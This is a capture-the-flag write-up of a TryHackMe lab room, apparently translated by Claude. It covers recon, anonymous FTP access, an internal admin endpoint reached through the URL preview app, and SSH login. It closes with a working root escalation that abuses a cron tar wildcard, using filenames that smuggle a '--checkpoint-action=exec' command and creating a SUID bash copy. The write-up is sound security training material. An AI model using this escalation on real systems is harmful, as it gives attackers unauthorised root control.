> *This translation has been made by Claude, check out the original writeup [here](README.md).*

# Operation Coldstart

![Screenshot](img/Pasted%20image%2020260527120500.png)

https://tryhackme.com/room/operationcoldstart
## Introduction

> Volt Labs, a small SaaS shop, suspects an old staging server has rotted into an exposed liability. Mara has assigned you the engagement. Find your way in and demonstrate full compromise.

![Screenshot](img/Pasted%20image%2020260527120603.png)
## Recon

A quick scan with nmap shows there are three open ports: 80 (fitting for a staging site), 22 (ssh is usually open on these boxes) and 21 (ftp, uh oh).
### The website

The website takes me to Volt Labs and their URL Preview Service

![Screenshot](img/Pasted%20image%2020260527123132.png)

I like that it says "do not expose externally" in the copyright text :)

Entering "Google" in the form gives me the following:

![Screenshot](img/Pasted%20image%2020260527123227.png)

The search term shows up as a query parameter in the URL. Possible route for SQLi?

![Screenshot](img/Pasted%20image%2020260527123503.png)

What does a fuzz of endpoints turn up? Not much exciting...

![Screenshot](img/Pasted%20image%2020260527133024.png)
## FTP

Is anonymous login allowed? You bet! What do we find? Some kind of backup, exciting.

![Screenshot](img/Pasted%20image%2020260527133255.png)

The tar file contained a folder called `voltlabs-preview` with a bunch of stuff in it:

![Screenshot](img/Pasted%20image%2020260527133536.png)
#### README.md
![Screenshot](img/Pasted%20image%2020260527133643.png)
#### requirements.txt
![Screenshot](img/Pasted%20image%2020260527133708.png)
#### app.py
Here we get insight into what the app hosted on the server looks like. I immediately notice a comment

![Screenshot](img/Pasted%20image%2020260527134111.png)

I assume that if we add `kestrel.thm` to `/etc/hosts` it'll work. Right now our requests get the IP number as the host header.

At the bottom we also find the following:

![Screenshot](img/Pasted%20image%2020260527134449.png)

Once we have the right hostname in `/etc/hosts` we can hopefully point the app at `http://kestrel.thm/admin/notes` and see what's in the file `/opt/voltlabs-preview/admin_notes.txt` on the server.

Voilà!

![Screenshot](img/Pasted%20image%2020260527135149.png)
## SSH

Can we get onto the box? Oh yes! And there we have `user.txt`

![Screenshot](img/Pasted%20image%2020260527135259.png)

Time to escalate!
## Flag two

Unfortunately the user `webdev` isn't allowed to run anything with sudo.

Any interesting cronjobs?

![Screenshot](img/Pasted%20image%2020260527140248.png)

![Screenshot](img/Pasted%20image%2020260527140320.png)

`voltlabs-backup` in particular looks especially interesting!

![Screenshot](img/Pasted%20image%2020260527140953.png)

Every minute a cronjob runs that cd's into `/opt/backups` and creates a backup as a tar file. The wildcard `*` picks up all files in the directory and bakes them into the backup. But, we can exploit this!

There's a vulnerability when **tar** and the wildcard `*` are run together like this. Tar uses the wildcard to bundle in *all the files*, but before tar gets to do that, the shell replaces `*` with all the filenames in that directory. If we then create files named `--` something, **tar** will mistake these files for a flag/command-line option.

Are you with me? I'm sort of with it. Let's go!

```bash
# Navigate to the right directory
cd /opt/backups

# Create shell.sh with the SUID bit set. And yes, rootbeer sounds more fun than rootbash
echo 'cp /bin/bash /tmp/rootbeer && chmod +s /tmp/rootbeer' > shell.sh

# Make the file executable
chmod +x shell.sh

# Create two files. The naming makes tar mistake them for cli options
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

After waiting a little while I ran `/tmp/rootbeer -p` and got my root shell:

![Screenshot](img/Pasted%20image%2020260601121622.png)

After that it was just a matter of grabbing the flag. Happy hacking!
